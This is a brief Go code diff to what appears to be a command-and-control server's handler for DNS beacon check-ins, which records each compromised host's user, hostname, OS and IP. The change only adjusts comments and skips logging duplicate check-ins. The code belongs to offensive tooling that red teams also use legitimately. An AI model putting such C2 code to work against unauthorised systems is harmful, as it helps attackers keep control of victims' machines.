@@ -517,7 +517,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			TaskQueue: []Task{},
 		}
 		c2.beacons[beaconID] = beacon
-		// Always log new beacon registration
+		// Always log new beacon registration (even if duplicate DNS query)
 		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
 	}
 
@@ -529,8 +529,8 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	beacon.LastSeen = time.Now()
 	beacon.IPAddress = clientIP
 
-	// Only log checkins in debug mode to keep console clean
-	if c2.debug {
+	// Only log checkins in debug mode and skip duplicates
+	if c2.debug && !isDuplicate {
 		logf("[C2] Checkin: %s (%s@%s) from %s",
 			beaconID, username, hostname, clientIP)
 	}
